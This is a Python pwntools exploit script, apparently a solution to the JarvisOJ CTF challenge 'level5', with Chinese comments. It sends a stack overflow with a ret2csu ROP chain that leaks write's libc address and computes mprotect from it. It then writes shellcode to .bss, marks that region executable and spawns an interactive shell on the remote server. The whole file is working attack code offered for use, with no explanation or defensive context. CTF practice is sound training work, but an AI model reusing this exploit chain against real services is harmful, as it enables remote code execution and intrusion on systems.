# coding:utf-8
from pwn import *
context(arch='amd64',os='linux')

sh = remote('pwn2.jarvisoj.com', 9884)

elf = ELF('./level5')
libc = ELF('./libc-2.19.so')

write_plt = elf.plt['write']
write_got = elf.got['write']
vuln_addr = elf.symbols['vulnerable_function']

gadget1 = 0x4006aa
gadget2 = 0x400690

# 泄露write函数地址
payload1 = 'a' * (0x80 + 0x8) + p64(gadget1)
payload1 += p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) # 依次给rbx、rbp、r12、rdx、rsi、rdi赋值
payload1 += p64(gadget2)
payload1 += 'a' * 56 # padding
payload1 += p64(vuln_addr)

sh.recvuntil('Input:\n')
sh.sendline(payload1)
write_addr = u64(sh.recv(8))

write_libc = libc.symbols['write']
mprotect_libc = libc.symbols['mprotect']

bss_addr = 0x600a88
read_plt = elf.plt['read']
read_got = elf.got['read']

# mprotect函数在内存中的真实地址
mprotect_addr = write_addr - write_libc + mprotect_libc

# 创建shellcode
shellcode = p64(mprotect_addr) + asm(shellcraft.amd64.sh())

# 调用read函数将shellcode写入bss段
payload2 = 'a' * (0x80 + 0x8) + p64(gadget1)
payload2 += p64(0) + p64(1) + p64(read_got) + p64(len(shellcode)) + p64(bss_addr) + p64(0)
payload2 += p64(gadget2)
payload2 += 'a' * 56
payload2 += p64(vuln_addr)

sh.recvuntil('Input:\n')
sh.sendline(payload2)
sh.send(shellcode)

# 调用mprotect函数修改bss段权限，并控制程序跳转到bss段执行shellcode
payload3 = 'a' * (0x80 + 0x8) + p64(gadget1)
payload3 += p64(0) + p64(1) + p64(bss_addr) # 跳转到bss端开始去执行mprotect函数
payload3 += p64(7) + p64(0x1000) + p64(0x600000) # mprotect函数的3个参数
payload3 += p64(gadget2)
payload3 += 'a' * 56
payload3 += p64(bss_addr + 8)

sh.recvuntil('Input:\n')
sh.sendline(payload3)

sh.interactive()
sh.close()